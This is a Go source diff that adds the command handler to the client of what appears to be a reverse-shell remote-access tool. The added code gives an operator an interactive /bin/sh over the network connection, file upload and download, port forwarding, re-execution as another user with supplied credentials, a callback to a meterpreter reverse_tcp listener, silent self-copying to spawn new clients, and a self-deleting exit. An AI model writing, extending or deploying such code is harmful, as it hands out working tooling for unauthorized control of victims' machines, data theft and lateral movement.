@@ -2,15 +2,253 @@ package client
 
 import (
 	"fmt"
+	"io"
 	"log"
 	"net"
 	"os"
+	"os/exec"
+	"strconv"
+	"strings"
 
+	"../meter"
+	"../plugins"
+	"../shell"
 	"../utils"
 	"github.com/hashicorp/yamux"
 )
 
 var activeForwards []utils.Forward
+var shellQuit chan bool
+var shellCmd *exec.Cmd
+var shellPipeReader *io.PipeReader
+var shellPipeWriter *io.PipeWriter
+
+// print usage that is shared between os clients
+func usage() string {
+	usage := "Usage:\n"
+	usage += "└ Shared Commands:"
+	usage += "  !exit\n"
+	usage += "  !upload <src> <dst>\n"
+	usage += "   * uploads a file to the target\n"
+	usage += "  !download <src> <dst>\n"
+	usage += "   * downloads a file from the target\n"
+	usage += "  !lfwd <localport> <remoteaddr> <remoteport>\n"
+	usage += "   * local portforwarding (like ssh -L)\n"
+	usage += "  !rfwd <remoteport> <localaddr> <localport>\n"
+	usage += "   * remote portforwarding (like ssh -R)\n"
+	usage += "  !lsfwd\n"
+	usage += "   * lists active forwards\n"
+	usage += "  !rmfwd <index>\n"
+	usage += "   * removes forward by index\n"
+	usage += "  !plugins\n"
+	usage += "   * lists available plugins\n"
+	usage += "  !plugin <plugin>\n"
+	usage += "   * execute a plugin\n"
+	usage += "  !spawn <port>\n"
+	usage += "   * spawns another client on the specified port\n"
+	usage += "  !shell\n"
+	usage += "   * runs /bin/sh\n"
+	usage += "  !runas <username> <password> <domain>\n"
+	usage += "   * restart xc with the specified user\n"
+	usage += "  !met <port>\n"
+	usage += "   * connects to a x64/meterpreter/reverse_tcp listener\n"
+	usage += "└ OS Specific Commands:"
+	return usage
+}
+
+func handleSharedCommand(s *yamux.Session, c net.Conn, argv []string, usage string, homedir string) bool {
+	handled := false
+	switch argv[0] {
+	case "!help":
+		handled = true
+		c.Write([]byte(usage))
+		prompt(c)
+	case "!runas":
+		handled = true
+		if len(argv) != 4 {
+			c.Write([]byte("Usage: !runas <username> <password> <domain>\n"))
+		} else {
+			shell.RunAs(argv[1], argv[2], argv[3], c)
+		}
+		prompt(c)
+	case "!met":
+		handled = true
+		if len(argv) > 1 {
+			port := argv[1]
+			ip := strings.Split(c.RemoteAddr().String(), ":")[0]
+			ok, err := meter.Connect(ip, port)
+			if !ok {
+				c.Write([]byte(err.Error() + "\n"))
+			}
+		} else {
+			c.Write([]byte("Usage: met <port>\n"))
+		}
+		prompt(c)
+	case "!upload":
+		handled = true
+		if len(argv) == 3 {
+			dst := argv[2]
+			// from the clients perspective we are downloading a file
+			utils.UploadConnect(dst, s)
+			c.Write([]byte("[+] Upload complete\n"))
+		} else {
+			c.Write([]byte("Usage: !upload <src> <dst>\n"))
+		}
+		prompt(c)
+	case "!download":
+		handled = true
+		if len(argv) == 3 {
+			src := argv[1]
+			utils.DownloadConnect(src, s)
+			c.Write([]byte("[+] Download complete\n"))
+		} else {
+			c.Write([]byte("Usage: !download <src> <dst>\n"))
+		}
+		prompt(c)
+	case "!lfwd":
+		handled = true
+		if len(argv) == 4 {
+			lport := argv[1]
+			raddr := argv[2]
+			rport := argv[3]
+			fwd := utils.Forward{lport, rport, raddr, make(chan bool)}
+			portAvailable := true
+			for _, item := range activeForwards {
+				if item.LPort == lport {
+					portAvailable = false
+					break
+				}
+			}
+			if portAvailable {
+				go lfwd(fwd, s, c)
+				activeForwards = append(activeForwards, fwd)
+			}
+		} else {
+			c.Write([]byte("Usage: !lfwd <localport> <remoteaddr> <remoteport> (opens local port)\n"))
+		}
+		prompt(c)
+	case "!rfwd":
+		handled = true
+		if len(argv) == 4 {
+			lport := argv[1]
+			raddr := argv[2]
+			rport := argv[3]
+			fwd := utils.Forward{lport, rport, raddr, make(chan bool)}
+
+			portAvailable := true
+			for _, item := range activeForwards {
+				if item.LPort == lport {
+					portAvailable = false
+					break
+				}
+			}
+			if portAvailable {
+				go rfwd(fwd, s, c)
+				activeForwards = append(activeForwards, fwd)
+			} else {
+				c.Write([]byte(fmt.Sprintf("Can not comply - Remote Port %s already in use.\n", lport)))
+			}
+		}
+		prompt(c)
+	case "!lsfwd":
+		handled = true
+		c.Write([]byte("Active Port Forwarding:\n"))
+		index := 0
+		remoteAddr := c.RemoteAddr().String()
+		remoteAddr = remoteAddr[:strings.LastIndex(remoteAddr, ":")]
+		localAddr := c.LocalAddr().String()
+		localAddr = localAddr[:strings.LastIndex(localAddr, ":")]
+		for _, v := range activeForwards {
+			c.Write([]byte(fmt.Sprintf("[%d] Listening on %s:%s, Traffic redirect to %s:%s\n", index, localAddr, v.LPort, remoteAddr, v.RPort)))
+			index++
+		}
+		prompt(c)
+	case "!rmfwd":
+		handled = true
+		if len(argv) == 2 {
+			index, _ := strconv.Atoi(argv[1])
+			// remove index and stop forward
+			forward := activeForwards[index]
+			forward.Quit <- true
+			activeForwards = append(activeForwards[:index], activeForwards[index+1:]...)
+		} else {
+			c.Write([]byte("Usage: !rmfwd <index>\n"))
+		}
+		prompt(c)
+	case "!shell":
+		handled = true
+		//log.Println("Entering shell")
+		shellCmd = shell.Shell()
+		shellPipeReader, shellPipeWriter = io.Pipe()
+		shellCmd.Stdin = c
+		shellCmd.Stdout = shellPipeWriter
+		shellCmd.Stderr = shellPipeWriter
+		go io.Copy(c, shellPipeReader)
+		shellCmd.Start()
+		shellCmd.Wait()
+		//log.Println("Quitting shell (exit)")
+		prompt(c)
+	case "!plugins":
+		handled = true
+		out := ""
+		for _, s := range plugins.List() {
+			out += s
+			out += ", "
+		}
+		if len(out) > 0 {
+			out = out[:len(out)-2] + "\n"
+			c.Write([]byte(out))
+		}
+		prompt(c)
+	case "!plugin":
+		handled = true
+		if len(argv) == 2 {
+			pluginName := argv[1]
+			plugins.Execute(pluginName, c)
+		} else {
+			c.Write([]byte("Usage: !plugin <name>\n"))
+		}
+		prompt(c)
+	case "!spawn":
+		handled = true
+		if len(argv) == 2 {
+			port := argv[1]
+			path := shell.CopySelf()
+			ip, _ := utils.SplitAddress(c.RemoteAddr().String())
+			cmd := fmt.Sprintf("%s %s %s\r\n", path, ip, port)
+			go shell.ExecSilent(cmd, c)
+		} else {
+			c.Write([]byte("Usage: !spawn <port>\n"))
+		}
+		prompt(c)
+	case "!exit":
+		handled = true
+		log.Println("Bye!")
+		shell.Seppuku(c)
+		os.Exit(0)
+	case "cd":
+		handled = true
+		if len(argv) == 2 {
+			dir := strings.ReplaceAll(argv[1], "~", homedir)
+			err := os.Chdir(dir)
+			if err != nil {
+				c.Write([]byte("Unable to change dir: " + err.Error() + "\n"))
+			}
+		} else {
+			c.Write([]byte("Usage: cd <directory>\n"))
+		}
+		prompt(c)
+	case "!sigint":
+		handled = true
+		// as soon as a shell is started this handler will no longer accept commands
+		fmt.Println("sigint reached client")
+		// is a !shell active ?
+		shellQuit <- true
+	default:
+		// pass
+	}
+	return handled
+}
 
 // splitArgs
 func splitArgs(cmd string) []string {
